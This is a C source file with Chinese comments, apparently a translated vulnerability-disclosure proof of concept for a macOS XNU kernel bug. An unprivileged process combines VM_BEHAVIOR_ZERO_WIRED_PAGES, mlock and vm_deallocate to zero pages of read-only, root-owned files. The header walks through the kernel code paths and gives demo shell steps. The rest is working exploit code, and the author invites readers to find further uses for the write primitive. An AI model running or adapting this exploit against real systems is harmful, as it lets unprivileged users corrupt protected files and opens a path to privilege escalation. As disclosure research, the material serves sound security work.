#if 0
XNU VM_BEHAVIOR_ZERO_WIRED_PAGES 行为允许向只读页面写入数据

% python3 -c "print('A'*0x8000)" > AAAAs.txt
% chmod a-w AAAAs.txt 
% sudo chown root:wheel AAAAs.txt 

// 文件现在是只读的，属于root用户，并且充满了字母A

% clang -o unwire_mlock_poc unwire_mlock_poc.c
% ./unwire_mlock_poc AAAAs.txt

// 文件仍然是只读的，属于root用户，但现在包含了一些零！

技术说明：

VME(虚拟内存条目)定义了特定映射对虚拟内存对象特定区域的访问权限。
(更多详情请参阅我之前报告的XNU vm问题和我2023年offensive会议演讲)

VM_BEHAVIOR_ZERO_WIRED_PAGES虚拟内存行为可以被任务设置在其映射中的任何vm_entry上；
这没有权限检查。它会设置entry->zero_wired_pages标志。

在vm_map_delete中，如果一个有非零wired_count的条目被从映射中移除，它会被传递给
vm_fault_unwire，后者会从底层对象查找页面(使用VM_PROT_NONE)

        result = vm_fault_page(
          object,
          (VME_OFFSET(entry) +
          (va - entry->vme_start)),
          VM_PROT_NONE, TRUE,
          FALSE, /* 页面未被查找 */
          &prot, &result_page, &top_page,
          (int *)0,
          NULL, map->no_zero_fill,
          &fault_info);

然后，如果条目中设置了zero_wired_pages，它会将页面传递给pmap_zero_page：

        if (entry->zero_wired_pages) {
          pmap_zero_page(VM_PAGE_GET_PHYS_PAGE(result_page));
          entry->zero_wired_pages = FALSE;
        }

在设置标志或清零页面时，都没有检查权限或尊重对象语义 - 底层页面仅在pmap层被清零。

一个挑战是你确实需要将页面锁定，而且页面必须是有价值的可写入的内容。

第一个发现是，锁定一个只读页面是可能且被支持的；例如，从该页面读取不会导致故障，但写入可能会。这意味着尝试锁定只读页面是可行的。

第二个发现是，你不能锁定具有对称复制语义的对象中的页面 - 这在实现实际语义的vm_map_wire_nested中强制执行。对称对象在这里转换为延迟复制，所以你不能使用此问题隐形地写入对称写时复制内存。

但仍有一些有趣的延迟复制对象，最明显的是vnode分页器(即文件及其UBC页面)。

直接调用mach_vm_wire需要host_priv端口(你需要是root)，但mlock是非特权的，它包装了对mach_vm_wire_kernel的调用。

所以总结起来，你可以打开一个只读的、属于root的文件，映射其中一个有趣的页面，将该vm_entry标记为VM_BEHAVIOR_ZERO_WIRED_PAGES，mlock该页面，然后mach_vm_deallocate该页面，文件中该区域的底层UBC页面将直接在pmap层被清零！

我相信你可以用这个原语做一些有趣的事情，不过这就留给读者自己去探索了 ;)

PoC仅在MacOS 15.2 (24C101)上的MacBook Pro 13英寸2019款(Intel，我用作内核调试目标的那台)上测试过
#endif

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>
// 移除了mach_vm.h，因为它在iOS中不被支持

void* map_file_page_ro(char* path) {
  int fd = open(path, O_RDONLY);

  if (fd == -1) {
  printf("打开文件失败\n");
  exit(EXIT_FAILURE);
  }

  void* mapped_at = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);

  if (mapped_at == MAP_FAILED) {
  printf("内存映射失败\n");
  exit(EXIT_FAILURE);  
  }

  return mapped_at;
}

int poc(char *path) {
  kern_return_t kr;

  
  void* page = map_file_page_ro(path);

  printf("文件映射到地址 0x%016llx\n", (uint64_t)page);

  kr = vm_behavior_set(mach_task_self(),
              (vm_address_t)page,
              PAGE_SIZE,
              VM_BEHAVIOR_ZERO_WIRED_PAGES);

  if (kr != KERN_SUCCESS) {
  printf("在条目上设置VM_BEHAVIOR_ZERO_WIRED_PAGES失败\n");
  exit(EXIT_FAILURE);
  }

  printf("已设置VM_BEHAVIOR_ZERO_WIRED_PAGES\n");
 
  // 锁定内存
  // 与mach_vm_wire不同，mlock不需要root权限
  int mlock_err = mlock(page, PAGE_SIZE);
  if (mlock_err != 0) {
  perror("mlock失败\n");
  exit(EXIT_FAILURE);
  }
  printf("mlock成功\n");

  kr = vm_deallocate(mach_task_self(),
              (vm_address_t)page,
              PAGE_SIZE);
  if (kr != KERN_SUCCESS) {
  printf("vm_deallocate失败: %s\n", mach_error_string(kr));
  exit(EXIT_FAILURE);
  }
  printf("在解除锁定前删除了映射条目\n");

  return 0;
}
